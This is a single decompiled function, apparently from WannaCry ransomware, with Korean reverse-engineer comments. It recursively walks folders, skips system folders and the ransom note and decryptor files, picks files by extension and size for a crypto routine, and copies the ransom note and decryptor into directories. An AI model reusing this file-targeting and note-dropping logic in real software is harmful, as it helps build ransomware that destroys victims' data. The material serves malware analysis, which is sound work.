// --- Metadata ---
// Function Name: DecryptFilesInDirectory_10002300
// Address: 0x10002300
// Exported At: 20250522_103328
// Signature: unknown_signature
// ---------------
int __thiscall DecryptFilesInDirectory_10002300(_DWORD *this, wchar_t *Format, int a3, int a4, int a5)
{
  _DWORD *v6; // eax 폴더 내 파일과 하위 폴더 탐색 후 조건에 따라 복호화 시도 및 실패한 파일은 별도 리스트에 보관 
  HANDLE v7; // edi
  int result; // eax
  _DWORD *v9; // eax
  size_t v10; // eax
  int v11; // eax
  wchar_t *i; // edi
  int v13; // edi
  wchar_t *v14; // esi
  wchar_t v15; // ax
  wchar_t *j; // ecx
  _DWORD *v17; // eax
  _DWORD *v18; // esi
  int v19; // edi
  wchar_t *v20; // eax
  _DWORD *v21; // edi
  _DWORD *v22; // esi
  void *v23; // eax
  wchar_t *v24; // edi
  wchar_t *v25; // esi
  wchar_t *v26; // eax
  wchar_t *v27; // [esp-8h] [ebp-A68h]
  char v28; // [esp+13h] [ebp-A4Dh]
  int v29; // [esp+14h] [ebp-A4Ch] BYREF
  void *v30; // [esp+18h] [ebp-A48h]
  int v31; // [esp+1Ch] [ebp-A44h]
  int v32; // [esp+20h] [ebp-A40h] BYREF
  void *v33; // [esp+24h] [ebp-A3Ch]
  int v34; // [esp+28h] [ebp-A38h]
  int v35; // [esp+2Ch] [ebp-A34h] BYREF
  int v36; // [esp+30h] [ebp-A30h] BYREF
  HANDLE hFindFile; // [esp+34h] [ebp-A2Ch]
  BOOL v38; // [esp+38h] [ebp-A28h]
  char v39[16]; // [esp+3Ch] [ebp-A24h] BYREF
  char v40[4]; // [esp+4Ch] [ebp-A14h] BYREF
  struct _WIN32_FIND_DATAW FindFileData; // [esp+50h] [ebp-A10h] BYREF
  wchar_t Buffer[360]; // [esp+2A0h] [ebp-7C0h] BYREF
  wchar_t v43; // [esp+570h] [ebp-4F0h] BYREF
  char v44[718]; // [esp+572h] [ebp-4EEh] BYREF
  wchar_t Destination[260]; // [esp+840h] [ebp-220h] BYREF
  DWORD v46; // [esp+A48h] [ebp-18h]
  DWORD v47; // [esp+A4Ch] [ebp-14h]
  int v48; // [esp+A50h] [ebp-10h]
  int v49; // [esp+A5Ch] [ebp-4h]

  v35 = (int)this;
  LOBYTE(v32) = v28;
  v6 = operator new(0x4ECu);
  *v6 = v6;
  v6[1] = v6;
  v33 = v6;
  v34 = 0;
  LOBYTE(v29) = v28;
  v49 = 1;
  v30 = CreateLinkedNode_10003730(0, 0);        // 연결 리스트 초기화 
  v31 = 0;
  swprintf(Buffer, (const size_t)L"%s\\*", Format);
  v7 = FindFirstFileW(Buffer, &FindFileData);
  hFindFile = v7;
  if ( v7 == (HANDLE)-1 )
  {
    LOBYTE(v49) = 0;
    DeleteNodeRangeDeep_100036A0(&v29, (int)&v35, *(void **)v30, (int)v30);
    operator delete(v30);
    v30 = 0;
    v31 = 0;
    v27 = *(wchar_t **)v33;
    v49 = -1;
    DeleteNodeRangeShallow_100037C0(&v32, (int)&v35, v27, (int)v33);
    operator delete(v33);
    result = 0;
  }
  else
  {
    v38 = TestDirectoryWritable_10002F70(Format);// 폴더 쓰기 검사 
    do
    {
      v9 = (_DWORD *)this[308];
      if ( v9 && *v9 )
        break;
      if ( wcscmp(FindFileData.cFileName, L".") && wcscmp(FindFileData.cFileName, L"..") )
      {
        swprintf(Buffer, (const size_t)L"%s\\%s", Format, FindFileData.cFileName);
        if ( (FindFileData.dwFileAttributes & 0x10) != 0 )
        {
          if ( !IsCriticalSystemFolder_100032C0(Buffer, FindFileData.cFileName) )
          {
            v39[0] = v28;
            std::wstring::_Tidy(v39, 0);
            v10 = wcslen(Buffer);
            std::wstring::assign(v39, Buffer, v10);
            LOBYTE(v49) = 2;
            InsertNewWStringNode_100035C0(&v29, v40, v30, (int)v39);
            LOBYTE(v49) = 1;
            std::wstring::_Tidy(v39, 1);
          }
        }
        else if ( v38 )
        {
          if ( wcscmp(FindFileData.cFileName, L"@Please_Read_Me@.txt") )
          {
            if ( wcscmp(FindFileData.cFileName, L"@WanaDecryptor@.exe.lnk") )
            {
              if ( wcscmp(FindFileData.cFileName, L"@WanaDecryptor@.bmp") )
              {
                v43 = 0;
                memset(v44, 0, 0x4E0u);
                HIWORD(v48) = 0;
                v11 = GetFileExtensionType_10002D60(FindFileData.cFileName);
                v48 = v11;
                if ( v11 != 6
                  && v11 != 1
                  && (v11 || FindFileData.nFileSizeHigh || FindFileData.nFileSizeLow >= 0xC800000) )
                {
                  wcsncpy(Destination, FindFileData.cFileName, 0x103u);
                  wcsncpy(&v43, Buffer, 0x167u);
                  v47 = FindFileData.nFileSizeHigh;
                  v46 = FindFileData.nFileSizeLow;
                  InsertNodeAfterCopyData_10003760(&v32, &v36, v33, &v43);
                }
              }
            }
          }
        }
      }
      v7 = hFindFile;
    }
    while ( FindNextFileW(hFindFile, &FindFileData) );
    FindClose(v7);
    for ( i = *(wchar_t **)v33; i != v33; i = *(wchar_t **)i )
    {
      if ( !decryptFileByState_10002940(this, i + 4, 1) )
        InsertNodeAfterCopyData_10003760((_DWORD *)a3, &v36, *(_DWORD **)(a3 + 4), i + 4);
    }
    v13 = a4;
    if ( a4 == -1 )
    {
      v14 = Format;
      v13 = 0;
      if ( wcsnicmp(Format, L"\\\\", 2u) )
        v13 = 1;
      else
        v14 = Format + 2;
      v15 = *v14;
      for ( j = v14; v15; ++j )
      {
        if ( v15 == 92 )
          ++v13;
        v15 = j[1];
      }
    }
    if ( v13 <= 6 && v34 )
    {
      CopyReadMeFileToPath_10003200(Format);
      if ( v13 > 4 )
        CopyDecLnkFileToPath_10003240(Format);
      else
        CopyDecryptorFileToPath_10003280(Format);
    }
    v17 = v30;
    if ( a5 )
    {
      v18 = *(_DWORD **)v30;
      if ( *(void **)v30 != v30 )
      {
        v19 = v13 + 1;
        do
        {
          v20 = (wchar_t *)v18[3];
          if ( !v20 )
            v20 = (wchar_t *)`std::wstring::_Nullstr'::`2'::_C;
          DecryptFilesInDirectory_10002300((_DWORD *)v35, v20, a3, v19, a5);// 재귀적으로 폴더 검사 
          v18 = (_DWORD *)*v18;
          v17 = v30;
        }
        while ( v18 != v30 );
      }
    }
    v21 = v17;
    LOBYTE(v49) = 0;
    v22 = (_DWORD *)*v17;
    if ( (_DWORD *)*v17 != v17 )
    {
      do
      {
        v23 = v22;
        v22 = (_DWORD *)*v22;
        RemoveNodeAndFree_10003620(&v29, (int)&v36, v23);
      }
      while ( v22 != v21 );
      v17 = v30;
    }
    operator delete(v17);
    v24 = (wchar_t *)v33;
    v30 = 0;
    v31 = 0;
    v25 = *(wchar_t **)v33;
    if ( *(void **)v33 != v33 )
    {
      do
      {
        v26 = v25;
        v25 = *(wchar_t **)v25;
        **((_DWORD **)v26 + 1) = *(_DWORD *)v26;
        *(_DWORD *)(*(_DWORD *)v26 + 4) = *((_DWORD *)v26 + 1);
        operator delete(v26);
        --v34;
      }
      while ( v25 != v24 );
    }
    operator delete(v33);
    result = 1;
  }
  return result;
}
